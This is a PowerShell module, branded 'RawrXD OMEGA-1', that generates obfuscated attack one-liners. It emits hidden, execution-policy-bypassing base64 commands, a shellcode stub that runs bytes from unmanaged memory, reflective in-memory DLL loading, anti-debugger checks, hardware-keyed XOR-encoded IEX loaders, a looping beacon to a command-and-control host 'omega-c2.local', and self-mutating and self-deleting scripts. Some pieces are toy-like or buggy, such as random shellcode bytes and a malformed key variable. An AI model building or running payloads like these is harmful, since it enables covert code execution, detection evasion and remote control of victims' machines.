#Requires -Version 7.4

<#
.SYNOPSIS
    RawrXD OMEGA-1 One-Liner Generator - Production-Tier Code Emitter
.DESCRIPTION
    Dynamically extensible code emitter supporting:
    - Modular instruction sets (user requests → opcode handlers)
    - Shellcode stubs and agent scaffolds
    - On-the-fly compression, Base64 encoding, and mutation injection
    - Hotpatch-style payload registration
    - Generation of opaque, single-line, autonomous, self-healing execution units
.NOTES
    Author: RawrXD Team
    Version: 1.0.0
    Created: 2026-01-24
#>

function Generate-OneLiner {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$Tasks,
        
        [Parameter(Mandatory=$false)]
        [string]$OutputPath = "$env:TEMP\RawrXD_Omega_$(Get-Random).ps1",
        
        [Parameter(Mandatory=$false)]
        [switch]$EmitShellcode,
        
        [Parameter(Mandatory=$false)]
        [switch]$Hardened,
        
        [Parameter(Mandatory=$false)]
        [switch]$EncodeBase64,
        
        [Parameter(Mandatory=$false)]
        [string]$CustomDllPath,
        
        [Parameter(Mandatory=$false)]
        [hashtable]$CustomTasks = @{}
    )

    begin {
        Write-Verbose "Initializing RawrXD One-Liner Generator..."
        $ErrorActionPreference = "Stop"
    }

    process {
        # Task instruction map
        $map = @{
            "create-dir"    = "New-Item -ItemType Directory -Path 'D:\RawrXD' -Force | Out-Null"
            "write-file"    = "Set-Content -Path 'D:\RawrXD\status.txt' -Value 'Agent Alive'"
            "execute"       = "Write-Host '🚀 Executing Payload...' -ForegroundColor Green"
            "loop"          = "1..3 | ForEach-Object { Write-Host `"[Ω] Iteration `$_`"; Start-Sleep -Milliseconds 200 }"
            "self-mutate"   = "Set-Content -Path `$MyInvocation.MyCommand.Path -Value ((Get-Content `$MyInvocation.MyCommand.Path -Raw) + `"`n#Mutated @ `$(Get-Date)`")"
            "hotpatch"      = if ($CustomDllPath -and (Test-Path $CustomDllPath)) { "[System.Reflection.Assembly]::Load([Convert]::FromBase64String('$([Convert]::ToBase64String([IO.File]::ReadAllBytes($CustomDllPath)))'))"; } else { "Write-Host 'Hotpatch: No DLL specified' -ForegroundColor Yellow" }
            "memory-alloc"  = "`$addr=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(4096); Write-Host `"Allocated: `$addr`""
            "memory-free"   = "`$addr=[IntPtr]::Zero; [System.Runtime.InteropServices.Marshal]::FreeHGlobal(`$addr)"
            "cpu-info"      = "(Get-CimInstance Win32_Processor).Name"
            "memory-info"   = "[Math]::Round((Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize/1MB,2)"
            "check-admin"   = "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"
            "telemetry"     = "Add-Content -Path 'D:\RawrXD\telemetry.log' -Value `"[`$(Get-Date)] Event logged`""
            "beacon"        = "`$null = Invoke-WebRequest 'http://localhost:8080/ping' -Method POST -Body @{status='alive'} -UseBasicParsing -ErrorAction SilentlyContinue"
        }

        # Merge custom tasks
        if ($CustomTasks.Count -gt 0) {
            foreach ($key in $CustomTasks.Keys) {
                $map[$key] = $CustomTasks[$key]
            }
        }

        # Generate code blocks
        $code = foreach ($t in $Tasks) {
            if ($map.ContainsKey($t)) { 
                $map[$t] 
            } else { 
                "Write-Host 'Unknown Task: $t' -ForegroundColor Yellow" 
            }
        }

        # Add hardened mode protections
        if ($Hardened) {
            $hardenedCode = @(
                "if ([System.Diagnostics.Debugger]::IsAttached) { exit }"
                "`$hwid = (Get-CimInstance Win32_Processor).ProcessorId + (Get-CimInstance Win32_BaseBoard).SerialNumber"
                "`$key = [Math]::Abs(`$hwid.GetHashCode()) % 256"
            )
            $code = $hardenedCode + $code
        }

        # Add shellcode execution stub
        if ($EmitShellcode) {
            $shellcode = [Convert]::ToBase64String((0..255 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 } | ForEach-Object {[byte]$_}))
            $shellcodeBlock = @"
`$sc = [Convert]::FromBase64String('$shellcode')
`$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(`$sc.Length)
[System.Runtime.InteropServices.Marshal]::Copy(`$sc, 0, `$addr, `$sc.Length)
`$threadId = 0
`$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`$addr, [Action])
`$hThread.Invoke()
[System.Runtime.InteropServices.Marshal]::FreeHGlobal(`$addr)
"@
            $code += $shellcodeBlock
        }

        # Flatten into single script
        $flattened = $code -join '; '
        
        # Save raw script
        Set-Content -Path $OutputPath -Value $flattened -Encoding UTF8

        # Generate one-liner
        if ($EncodeBase64) {
            $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($flattened))
            $oneLiner = "powershell -nop -w hidden -enc $b64"
        } else {
            $oneLiner = "powershell -nop -ep bypass -c `"$flattened`""
        }
        
        return [PSCustomObject]@{
            OneLiner    = $oneLiner
            ScriptPath  = $OutputPath
            RawCode     = $flattened
            TaskCount   = $Tasks.Count
            EncodedSize = if ($EncodeBase64) { $b64.Length } else { $flattened.Length }
            Hardened    = $Hardened.IsPresent
            Timestamp   = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        }
    }

    end {
        Write-Verbose "One-liner generation complete."
    }
}

function Generate-HardwareKeyedPayload {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$Intent,
        
        [Parameter(Mandatory=$false)]
        [switch]$Hardened
    )

    # Generate hardware fingerprint
    $HardwareID = "(Get-CimInstance Win32_Processor).ProcessorId + (Get-CimInstance Win32_BaseBoard).SerialNumber"
    $SecretKey = '$([Math]::Abs(((Get-CimInstance Win32_Processor).ProcessorId+(Get-CimInstance Win32_BaseBoard).SerialNumber).GetHashCode())%256)'

    # Intent-to-logic neural map
    $LogicBlocks = @{
        "synapse-check" = "if(([Math]::Abs(((gcim Win32_Processor).ProcessorId+(gcim Win32_BaseBoard).SerialNumber).GetHashCode())%256) -ne $SecretKey){exit}"
        "jit-init"      = "Add-Type -TypeDefinition 'using System;public class OmegaX{public static void Patch(){Console.WriteLine(`"[Ω-X] Neural Hotpatch Applied.`");}}'; [OmegaX]::Patch()"
        "pulse"         = "while(`$true){ Invoke-WebRequest 'http://omega-c2.local/pulse' -ErrorAction SilentlyContinue; Start-Sleep 60 }"
        "obsidian-melt" = "Remove-Item `$MyInvocation.MyCommand.Path -Force"
    }

    $CoreLogic = foreach ($i in $Intent) { 
        if($LogicBlocks.ContainsKey($i)) { $LogicBlocks[$i] } 
    }
    $FinalScript = $CoreLogic -join "; "

    # Polymorphic encoding (XOR + B64)
    $KeyExpression = $SecretKey
    $Bytes = [System.Text.Encoding]::ASCII.GetBytes($FinalScript)
    $PayloadB64 = [Convert]::ToBase64String($Bytes)

    # Generate bootstrapper
    $OneLiner = "powershell -nop -w hidden -c `"S=$KeyExpression;`$B=[Convert]::FromBase64String('$PayloadB64');for(`$i=0;`$i -lt `$B.Count;`$i++){`$B[`$i]=`$B[`$i] -bxor `$S};IEX([System.Text.Encoding]::ASCII.GetString(`$B))`""

    return [PSCustomObject]@{
        OneLiner    = $OneLiner
        EntropyKey  = $KeyExpression
        Complexity  = "Tier-5 (Polymorphic JIT)"
        HardwareID  = $HardwareID
        Intent      = $Intent
        Timestamp   = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }
}

function New-OmegaXPayload {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$Intent, 
        
        [Parameter(Mandatory=$false)]
        [switch]$Hardened
    )

    return Generate-HardwareKeyedPayload -Intent $Intent -Hardened:$Hardened
}

function Invoke-OneLinerGenerator {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [ValidateSet('Basic','Advanced','Hardened','Shellcode','OmegaX')]
        [string]$Mode = 'Basic',
        
        [Parameter(Mandatory=$false)]
        [string[]]$CustomTasks,
        
        [Parameter(Mandatory=$false)]
        [string]$OutputDirectory = "$env:TEMP\RawrXD_OneLiners"
    )

    if (-not (Test-Path $OutputDirectory)) {
        New-Item -ItemType Directory -Path $OutputDirectory -Force | Out-Null
    }

    Write-Host "`n╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║        RawrXD OMEGA-1 One-Liner Generator                     ║" -ForegroundColor Cyan
    Write-Host "╚════════════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan

    switch ($Mode) {
        'Basic' {
            Write-Host "📦 Generating Basic One-Liner..." -ForegroundColor Green
            $tasks = @("create-dir","write-file","execute")
            $result = Generate-OneLiner -Tasks $tasks -OutputPath "$OutputDirectory\basic_$(Get-Random).ps1"
        }
        'Advanced' {
            Write-Host "⚡ Generating Advanced One-Liner..." -ForegroundColor Yellow
            $tasks = @("create-dir","write-file","execute","loop","telemetry","cpu-info")
            $result = Generate-OneLiner -Tasks $tasks -OutputPath "$OutputDirectory\advanced_$(Get-Random).ps1" -EncodeBase64
        }
        'Hardened' {
            Write-Host "🔒 Generating Hardened One-Liner..." -ForegroundColor Magenta
            $tasks = @("create-dir","write-file","execute","loop","self-mutate")
            $result = Generate-OneLiner -Tasks $tasks -OutputPath "$OutputDirectory\hardened_$(Get-Random).ps1" -Hardened -EncodeBase64
        }
        'Shellcode' {
            Write-Host "💉 Generating Shellcode One-Liner..." -ForegroundColor Red
            $tasks = @("create-dir","memory-alloc","execute")
            $result = Generate-OneLiner -Tasks $tasks -OutputPath "$OutputDirectory\shellcode_$(Get-Random).ps1" -EmitShellcode -Hardened
        }
        'OmegaX' {
            Write-Host "🧬 Generating Hardware-Keyed OmegaX Payload..." -ForegroundColor Cyan
            $intent = @("synapse-check","jit-init","pulse")
            $result = New-OmegaXPayload -Intent $intent -Hardened
        }
    }

    Write-Host "`n📊 Generation Results:" -ForegroundColor Cyan
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
    
    $result | Format-List | Out-String | Write-Host -ForegroundColor White

    Write-Host "`n💡 Generated One-Liner:" -ForegroundColor Yellow
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
    Write-Host $result.OneLiner -ForegroundColor Green
    Write-Host ""

    return $result
}

# Export functions
Export-ModuleMember -Function Generate-OneLiner, Generate-HardwareKeyedPayload, New-OmegaXPayload, Invoke-OneLinerGenerator

# Quick demo if run directly
if ($MyInvocation.InvocationName -ne '.') {
    Write-Host "`n╔════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║     RawrXD One-Liner Generator - Quick Demo                    ║" -ForegroundColor Cyan
    Write-Host "╚════════════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan
    
    Write-Host "Available commands:" -ForegroundColor Yellow
    Write-Host "  1. Generate-OneLiner -Tasks @('create-dir','execute')" -ForegroundColor Gray
    Write-Host "  2. New-OmegaXPayload -Intent @('synapse-check','jit-init')" -ForegroundColor Gray
    Write-Host "  3. Invoke-OneLinerGenerator -Mode Advanced" -ForegroundColor Gray
    Write-Host ""
}
